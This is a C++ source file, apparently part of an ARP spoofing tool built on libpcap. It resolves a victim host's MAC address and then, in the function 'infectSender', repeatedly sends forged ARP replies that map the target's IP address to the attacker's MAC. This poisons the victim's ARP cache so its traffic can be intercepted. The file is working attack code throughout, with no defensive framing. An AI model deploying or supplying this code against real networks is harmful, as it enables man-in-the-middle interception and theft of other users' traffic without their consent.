#include <arp.h>
#include <util.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int receiveSenderMacAddress(IN pcap_t *handle, IN IpManager senderIpAddress, OUT MacManager &senderMacAddress) {
    int waitCount = 20;
    int ret = EXIT_FAILURE;

    // packet parsing
    while(ret && --waitCount) {
        printf("[*] Finding MAC Address...\n");
        struct pcap_pkthdr *pcapHeader;
        const u_char *packet;
        if(pcap_next_ex(handle, &pcapHeader, &packet) < 0) {
            fprintf(stderr, "Failed receive packet\n");
            goto end;
        }

        // parse Ethernet in Datalink Layer
        MergedStructure *mergedPacket = (MergedStructure *)packet;
        IpManager  senderIpAddress(mergedPacket->arpPacket.senderProtocolAddress);
        MacManager destinationMacAddress(mergedPacket->ethernetPacket.destinationMacAddress);
        MacManager sourceMacAddress(mergedPacket->ethernetPacket.sourceMacAddress);

        switch(ntohs(mergedPacket->ethernetPacket.type)) {
            case ETHERNET_TYPE_ARP: // value is 0x0806
                if(!memcmp(mergedPacket->arpPacket.senderProtocolAddress, senderIpAddress, ARP_PROTOCOL_LENGTH_IP)) {
                    // Print Ethernet Packet
                    printf("[*] Ethernet Information\n");
                    destinationMacAddress.printMacAddress("  - Dest MAC : ");
                    sourceMacAddress.printMacAddress     ("  - Src  MAC : ");
                    printf("  - Type     : [%04x]\n",    ntohs(mergedPacket->ethernetPacket.type));

                    // Print ARP Packet
                    printf("[*] ARP Information\n");
                    printArpPacketInfo(mergedPacket->arpPacket);
                    senderMacAddress = mergedPacket->arpPacket.senderHardwareAddress;
                    printf("\n");
                    ret = EXIT_SUCCESS;

                }
                break;
            default:
                break;
        }

        sleep(1);
    }

end:
    return ret;
}

int getSenderMacAddress(IN pcap_t *handle, 
    IN MacManager targetMacAddress, IN IpManager targetIpAddress, 
    IN IpManager senderIpAddress, OUT MacManager &senderMacAddress) {
    int ret = EXIT_FAILURE;
    MergedStructure mergedPacket;

    // set source MAC Address for Ethernet
    memcpy(mergedPacket.ethernetPacket.sourceMacAddress, targetMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);

    // set destination MAC Address for Ethernet
    memset(mergedPacket.ethernetPacket.destinationMacAddress, 0xFF, ARP_HARDWARE_LENGTH_ETHERNET);

    // set Ethernet Type
    mergedPacket.ethernetPacket.type = htons(ETHERNET_TYPE_ARP);

    // Initialize ARP Packet
    mergedPacket.arpPacket.hardwareType   = htons(ARP_HARDWARE_TYPE_ETHERNET);
    mergedPacket.arpPacket.protocolType   = htons(ARP_PROTOCOL_TYPE_IP);
    mergedPacket.arpPacket.hardwareLength = ARP_HARDWARE_LENGTH_ETHERNET;
    mergedPacket.arpPacket.protocolLength = ARP_PROTOCOL_LENGTH_IP;
    mergedPacket.arpPacket.operationCode  = htons(ARP_OPERATION_REQUEST);

    // set source MAC Address for ARP
    memcpy(mergedPacket.arpPacket.senderHardwareAddress, targetMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);

    // set destination MAC Address
    memset(mergedPacket.arpPacket.targetHardwareAddress, 0x00, ARP_HARDWARE_LENGTH_ETHERNET);

    // set source IP Address
    memcpy(mergedPacket.arpPacket.senderProtocolAddress, targetIpAddress, ARP_PROTOCOL_LENGTH_IP);

    // set destination IP Address 
    memcpy(mergedPacket.arpPacket.targetProtocolAddress, senderIpAddress, ARP_PROTOCOL_LENGTH_IP);

    printf("[+] Initialize\n");
    printArpPacketInfo(mergedPacket.arpPacket);
    printf("\n");

    while(1) {
        printf("[*] Send ARP Packet\n");
        if(pcap_sendpacket(handle, (const u_char *)&mergedPacket, sizeof(mergedPacket))) {
            fprintf(stderr, "Send ARP Packet Error!\n");
            goto end;   
        }
        printf("\n");

        printf("[+] Get MAC Address\n");
        //memset(mergedPacket.arpPacket.senderHardwareAddress, 0x00, ARP_HARDWARE_LENGTH_ETHERNET);
        if(receiveSenderMacAddress(handle, senderIpAddress, senderMacAddress) == EXIT_SUCCESS) {
            break;
        }
    }

    ret = EXIT_SUCCESS;

end:
    return ret;
}

int infectSender(IN pcap_t *handle, IN MacManager localMacAddress, IN ArpSession arpSession) {
    return infectSender(handle, localMacAddress, arpSession, -1);
}

int infectSender(IN pcap_t *handle, IN MacManager localMacAddress, IN ArpSession arpSession, IN int count) {
    int ret = EXIT_FAILURE;
    struct in_addr laddr;
    MergedStructure mergedStructure;

    // set source MAC Address for Ethernet
    memcpy(mergedStructure.ethernetPacket.sourceMacAddress, localMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);

    // set destination MAC Address for Ethernet
    memcpy(mergedStructure.ethernetPacket.destinationMacAddress, arpSession.senderMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);

    // set Ethernet Type
    mergedStructure.ethernetPacket.type = htons(ETHERNET_TYPE_ARP);

    // Initialize ARP Packet
    mergedStructure.arpPacket.hardwareType   = htons(ARP_HARDWARE_TYPE_ETHERNET);
    mergedStructure.arpPacket.protocolType   = htons(ARP_PROTOCOL_TYPE_IP);
    mergedStructure.arpPacket.hardwareLength = ARP_HARDWARE_LENGTH_ETHERNET;
    mergedStructure.arpPacket.protocolLength = ARP_PROTOCOL_LENGTH_IP;
    mergedStructure.arpPacket.operationCode  = htons(ARP_OPERATION_REPLY);

    // set sender MAC Address for ARP
    memcpy(mergedStructure.arpPacket.senderHardwareAddress, localMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);

    // set target MAC Address for ARP
    memcpy(mergedStructure.arpPacket.targetHardwareAddress, arpSession.senderMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);

    // set source IP Address
    memcpy(mergedStructure.arpPacket.senderProtocolAddress, arpSession.targetIpAddress, ARP_PROTOCOL_LENGTH_IP);

    // set destination IP Address
    memcpy(mergedStructure.arpPacket.targetProtocolAddress, arpSession.senderIpAddress, ARP_PROTOCOL_LENGTH_IP);

    printf("[+] Initialize\n");
    printArpPacketInfo(mergedStructure.arpPacket);
    printf("\n");

    while(count--) {
        printf("[*] Send ARP Packet...\n");
        if(pcap_sendpacket(handle, (u_char *)&mergedStructure, sizeof(MergedStructure))) {
            fprintf(stderr, "Send ARP Packet Error!\n");
            goto end;
        }
        sleep(3);
    }

    ret = EXIT_SUCCESS;

end:
    return ret;
}

